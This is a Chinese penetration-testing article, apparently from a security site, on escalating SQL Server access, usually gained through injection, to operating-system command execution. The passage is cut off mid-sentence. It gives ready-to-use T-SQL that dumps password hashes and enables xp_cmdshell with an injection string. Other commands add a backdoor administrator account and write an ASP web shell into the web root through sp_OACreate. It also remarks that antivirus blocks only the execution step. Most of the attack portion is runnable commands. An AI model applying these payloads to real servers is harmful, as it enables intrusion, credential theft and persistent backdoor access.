---
title: sql server执行os-shell
url: https://www.secpulse.com/archives/190217.html
source: 安全脉搏
date: 2022-11-03
fetch_date: 2025-10-03T21:37:03.126413
---

# sql server执行os-shell

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# sql server执行os-shell

[脉搏文库](https://www.secpulse.com/archives/category/category/secdocs)

[TideSec](https://www.secpulse.com/newpage/author?author_id=26366)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2022-11-02

11,726

# 1 sql server执行os-shell

条件：数据库权限必须是dba权限 可利用sql-shll进行命令执行，部分常用ql语句：

```
查看版本：SELECT @@version
查看连接用户：
 SELECT ORIGINAL_LOGIN(),APP_NAME(), CONNECTIONPROPERTY('CLIENT_NET_ADDRESS') , CONNECTIONPROPERTY('PROTOCOL_TYPE')
 查询所有数据库名称
select name from master.dbo.sysdatabases;
查看用户hash：
select name,sys.fn_varbintohexstr(password_hash) from sys.sql_logins
查看数据库账号密码：
select name,sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins;

查看数据库中表名：

SELECT SysObjects.name AS Tablename FROM sysobjects WHERE xtype = 'U' and sysstat<200

exec xp_dirtree 'c:'        # 列出所有c:文件、目录、子目录exec xp_dirtree 'c:',1      # 只列c:目录
exec xp_dirtree 'c:',1,1    # 列c:目录、文件
exec xp_subdirs 'C:';       # 只列c:目录
select is_srvrolemember('sysadmin') # 判断是否是SA权限
select is_member('db_owner')        # 判断是否是db_owner权限
select is_srvrolemember('public')   # 判断是否是public权限
创建用户：
exec master..xp_cmdshell "net user test12 123.com add"

exec master..xp_cmdshell "net localgroup administrators test12 add"

exec master..xp_cmdshell "net user test12"
读取文档内容
create table files(line varchar(1024))

bulk insert  files from 'C:inetpubaa.asp'

select * from files
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190217-1667371387.png)

默认新建的用户只有public权限，  sqlserver数据库进行os-shell执行，主要是利用开启xp\_cmdshell进行命令执行，通过命令执行查看，返回结果为1，说明是存在xp\_cmdshell，该命令只能证明是否存在xp\_cmdshell，并不能证明可执行xp\_cmdshell

```
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190217-1667371389.png "null")

## 1.1针对sqlserver2008测试

### 1.1 当前用户不是dba

在当前用户不为dba情况，利用sqlmap执行os-shell，提示如下：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190217-1667371390.png)

非dba权限的用户即使在开启xpcmdshell的情况下也无法进行命令执行，提示没有权限：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190217-16673713901.png)

dba权限在未开启cmdshell情况下执行命令提示如下：当非dba权限尝试开启cmdshell时提示没有该操作权限：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190217-1667371391.png)

所以这就是为什么在我们发现sql注入的时候，如果当前用户不是dba权限的情况下无法进行命令执行。

### 1.2 当前用户为dba

在进行注入时，如果当前用户为dba，可尝试利用如下命令手动开启xpcmd\_shell

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

接下来分析下sqlmap如何去检测和开启xp\_cmdshell,通过抓取数据包发现，开启cmdshell命令如下：

```
;EXEC master..sp_configure 'SHOW advanced options',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'xp_cmdshell',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'SHOW advanced options',0; RECONFIGURE WITH OVERRIDE--
```

当尝试利用os-shell无法开启时，可尝试利用sql-shell开启，xpcmd\_shell，本次在测试时发现，直接在sql-shell中执行上述4条开启的语句无法开启成功，可尝试拼接sql语句进行开启

```
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell';EXEC master..sp_configure 'SHOW advanced options',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'xp_cmdshell',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'SHOW advanced options',0; RECONFIGURE WITH OVERRIDE--
```

查询语句为查看xpcmd\_shell组件的命令，执行语句后返回结果1，即为查询成功：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190217-1667371392.png)

判断是否存在站库分离：

```
select host_name();             //主机名
select @@servername;            //服务器名
//如果相同则代表数据库和web在同一台机器上面
```

执行后发现返回的服务器名称相同，可见未进行站库分离，如下图：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190217-1667371393.png)

即使主机上安装有360等安全设备，执行该命令后，也可以将xp cmd\_shell组件开启，通过测试发现，主机上杀毒软件拦截只有在调用xpcmd\_shell进行命令执行时才会进行拦截

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190217-16673713931.png)

### 1.3 xpcmd\_shell为什么无法执行命令

在没有防护的情况下，可利用sqlmap正常开启xpcmd\_shell进行命令执行，但是很多情况下会发现 无法进行命令执行，sqlmap提示如下：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190217-1667371394.png)

此时可能原因是对服务器上安装有安全软件，本次测试在测试环境中安全了360安全软件，可在调用xpcmd\_shell组件时，被安全软件拦截

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190217-1667371395.png)

思路一：如果在已知sqlserver账户密码的情况下，利用navicat连接数据库进行手动写入shell：开启sp\_OACreate组件

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE WITH OVERRIDE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE;
EXEC sp_configure 'show advanced options', 0;
```

利用文件存储先写入文件：

```
declare @o int, @f int, @t int, @ret int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'createtextfile', @f out, 'c:inetpubaa.asp', 1
exec @ret = sp_oamethod @f, 'writeline', NULL,'<%execute(request("a"))%>'
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190217-1667371396.png "null")

可成功在c盘inetpub路径下写入aa.asp文件，shell的写入路径可利用execute master..xp\_dirtree命令进行查找

```
execute master..xp_dirtree 'c:/inetpub/test/',1,1
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190217-1667371397.png)

利用上述方法的前提是在已经知道sqlsever数据库的的管理账号密码，可利用--passwords 参数查看。思路二：假如未能成功登录，可先通过查看网站路径，在写入shell方式，步骤如下: 1、新建tmp表格，并将master..xp\_dirtree的存储结果保存到表格中，命令如下：

```
CREATE TABLE tmp (dir varchar(8000),num int,num1 int);insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:',1,1;
```

可在sql-shell中执行，执行效果如下：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-190217-1667371398.png "null")

也可通过注入点直接执行，执...